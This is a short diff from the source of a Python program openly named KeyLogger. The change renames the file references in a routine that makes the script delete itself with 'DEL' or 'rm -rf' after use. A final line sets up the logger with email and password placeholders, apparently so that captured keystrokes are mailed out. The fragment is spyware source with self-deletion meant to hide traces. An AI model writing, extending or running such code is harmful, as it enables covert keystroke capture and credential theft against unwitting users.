@@ -64,20 +64,20 @@ class KeyLogger:
         if os.name == "nt":
             try:
                 os.system("YOUR DIRECTORY")
-                os.rename('keylogger.py', 'keylogger.bat')
-                os.rename('keylogger.bat', 'keylogger.py')
+                os.rename('main.py', 'main.bat')
+                os.rename('main.bat', 'main.py')
             except OSError:
                 print('File is still open.')
-                os.system("DEL keylogger.py")
+                os.system("DEL main.py")
 
         else:
             try:
                 os.system("YOUR DIRECTORY")
-                os.rename('keylogger.py', 'keylogger.bat')
-                os.rename('keylogger.bat', 'keylogger.py')
+                os.rename('main.py', 'main.bat')
+                os.rename('main.bat', 'main.py')
             except OSError:
                 print('File is still open.')
-                os.system("rm -rf keylogger.py")
+                os.system("rm -rf main.py")
 
 
 keylogger = KeyLogger(10, 'YOUR MAIL', 'PASSWORD')
